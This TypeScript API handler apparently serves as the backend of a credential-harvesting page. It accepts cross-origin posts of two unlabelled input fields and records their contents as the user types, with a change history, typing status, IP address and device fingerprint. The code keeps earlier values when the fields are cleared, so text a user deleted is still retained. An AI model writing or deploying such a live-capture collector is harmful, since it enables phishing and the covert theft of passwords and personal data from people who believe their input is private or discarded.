import fs from 'fs';
import path from 'path';

const DATA_FILE = path.join('/tmp', 'records.json');

function getRecords() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
  } catch (e) {
    console.error('Error reading records:', e);
  }
  return {};
}

function saveRecords(data: any) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
  } catch (e) {
    console.error('Error saving records:', e);
  }
}

export default function handler(req: any, res: any) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { sessionId, box1 = '', box2 = '', isTyping = false, activeField = '', deviceInfo = {} } = req.body || {};

  if (!sessionId) {
    return res.status(400).json({ error: 'Missing sessionId' });
  }

  const records = getRecords();
  const now = Date.now();
  const existing = records[sessionId];

  if (!existing) {
    records[sessionId] = {
      id: sessionId,
      box1,
      box2,
      firstSeen: now,
      lastUpdated: now,
      isTyping,
      lastActiveField: activeField,
      history: [{ timestamp: now, box1, box2 }],
      ip: req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1',
      userAgent: deviceInfo.userAgent || req.headers['user-agent'] || '',
      device: deviceInfo.platform || 'Web',
      screen: deviceInfo.screen || '',
      language: deviceInfo.language || 'es',
    };
  } else {
    const isClearing = !box1 && !box2 && (existing.box1 || existing.box2);
    if (!isClearing) {
      const textChanged = existing.box1 !== box1 || existing.box2 !== box2;
      if (textChanged) {
        existing.history.push({ timestamp: now, box1, box2 });
        if (existing.history.length > 50) {
          existing.history = existing.history.slice(-50);
        }
      }
      existing.box1 = box1;
      existing.box2 = box2;
    }

    existing.lastUpdated = now;
    existing.isTyping = isTyping;
    existing.lastActiveField = activeField;
    if (deviceInfo.userAgent) existing.userAgent = deviceInfo.userAgent;
    if (deviceInfo.platform) existing.device = deviceInfo.platform;
    if (deviceInfo.screen) existing.screen = deviceInfo.screen;
  }

  saveRecords(records);
  return res.status(200).json({ success: true });
}
